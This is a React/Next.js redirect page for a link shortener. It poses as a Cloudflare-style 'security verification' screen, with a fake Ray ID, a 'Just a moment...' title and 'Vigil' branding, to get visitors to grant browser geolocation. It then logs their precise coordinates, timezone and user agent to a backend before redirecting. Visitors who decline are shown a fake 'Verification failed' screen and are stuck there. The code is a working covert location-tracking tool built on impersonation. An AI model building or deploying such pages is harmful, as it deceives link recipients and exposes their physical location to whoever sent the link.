"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { useParams } from "next/navigation";
import { supabase } from "../../lib/supabaseClient";

export default function RedirectPage() {
  const { code } = useParams();
  // resolving | ready | locating | blocked | redirecting | notfound | unsupported
  const [status, setStatus] = useState("resolving");
  const [link, setLink] = useState(null); // { url_id, destination_url }
  const [errorMsg, setErrorMsg] = useState("");
  const startedRef = useRef(false);

  // Presentational only (Cloudflare-style look): hostname, ray id, tab title
  const [hostname, setHostname] = useState("");
  const [rayId, setRayId] = useState("");

  useEffect(() => {
    setHostname(window.location.hostname);
    const bytes = new Uint8Array(8);
    crypto.getRandomValues(bytes);
    setRayId(
      Array.from(bytes)
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("")
    );
    document.title = "Just a moment...";
  }, []);

  const requestLocation = useCallback((urlId, destUrl) => {
    if (!("geolocation" in navigator)) {
      setStatus("unsupported");
      return;
    }
    setStatus("locating");

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        try {
          // invoke() does NOT throw on HTTP errors: it returns { error }
          const { error } = await supabase.functions.invoke("log-visit", {
            body: {
              url_id: urlId,
              latitude,
              longitude,
              accuracy,
              timezone,
              user_agent: navigator.userAgent,
            },
          });
          if (error) console.error("log-visit failed:", error);
        } catch (e) {
          // Logging failed: still redirect so the visitor isn't stuck
          console.error("Failed to log visit:", e);
        }

        setStatus("redirecting");
        window.location.replace(destUrl);
      },
      (err) => {
        console.warn("Geolocation error:", err.code, err.message);
        setStatus("blocked");
      },
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
    );
  }, []);

  useEffect(() => {
    if (!code || startedRef.current) return;
    startedRef.current = true;

    (async () => {
      try {
        const res = await fetch(`/api/resolve?code=${encodeURIComponent(code)}`);
        const json = await res.json();
        if (!res.ok) throw new Error(json.error || "Failed to resolve this link.");
        setLink(json);
        setStatus("ready");
        // Automatically trigger the browser's location prompt
        requestLocation(json.url_id, json.destination_url);
      } catch (e) {
        setErrorMsg(e.message);
        setStatus("notfound");
      }
    })();
  }, [code, requestLocation]);

  // Uniform failure look for every failure type (denied, timeout, unsupported)
  if (status === "blocked" || status === "unsupported") {
    return (
      <CfShell hostname={hostname} rayId={rayId}>
        <h2 className="cf-h2 cf-error-text">Verification failed</h2>
        <p className="cf-sub">
          Verification could not be completed. Please try again.
        </p>
        <Widget state="error" />
        <div>
          <button
            className="cf-retry"
            onClick={() => requestLocation(link.url_id, link.destination_url)}
          >
            Try again
          </button>
        </div>
      </CfShell>
    );
  }

  if (status === "notfound") {
    return (
      <CfShell hostname={hostname} rayId={rayId}>
        <div className="cf-box">
          <h2>Link not found</h2>
          <p className="cf-sub" style={{ marginTop: 8 }}>
            {errorMsg || "This short link does not exist."}
          </p>
        </div>
      </CfShell>
    );
  }

  if (status === "redirecting") {
    return (
      <CfShell hostname={hostname} rayId={rayId}>
        <h2 className="cf-h2">
          Verification successful. Waiting for {hostname || "the site"} to respond
        </h2>
        <Widget state="success" />
      </CfShell>
    );
  }

  // resolving | ready | locating
  return (
    <CfShell hostname={hostname} rayId={rayId}>
      <h2 className="cf-h2">Performing security verification...</h2>
      <p className="cf-sub">
        This page is performing a security check before you continue.
      </p>
      <Widget state="spinner" />
    </CfShell>
  );
}

/* ---------- presentational components (no logic) ---------- */

function CfShell({ hostname, rayId, children }) {
  return (
    <div className="cf-wrapper">
      <div className="cf-main">
        <div className="cf-title-row">
          <h1>{hostname}</h1>
        </div>
        {children}
      </div>
      <footer className="cf-footer">
        <div className="cf-footer-inner">
          <span>
            Performance &amp; security by <strong>Vigil</strong>
          </span>
          <span className="cf-footer-divider"></span>
          <span className="cf-ray">
            Ray ID: <code>{rayId}</code>
          </span>
        </div>
      </footer>
    </div>
  );
}

function Widget({ state }) {
  return (
    <div className={`cf-widget${state === "error" ? " cf-widget-error" : ""}`}>
      <div className="cf-widget-icon">
        {state === "spinner" && (
          <div className="cf-spinner">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
          </div>
        )}
        {state === "success" && (
          <svg viewBox="0 0 32 32" width="30" height="30" aria-hidden="true">
            <circle className="cf-check-circle" cx="16" cy="16" r="13" />
            <path className="cf-check-mark" d="M10 16.8 L14.2 21 L22.5 12.5" />
          </svg>
        )}
        {state === "error" && (
          <svg viewBox="0 0 32 32" width="30" height="30" aria-hidden="true">
            <circle className="cf-x-circle" cx="16" cy="16" r="13" />
            <path className="cf-x-mark" d="M11 11 L21 21 M21 11 L11 21" />
          </svg>
        )}
      </div>
      <span className="cf-widget-brand">VIGIL</span>
    </div>
  );
}
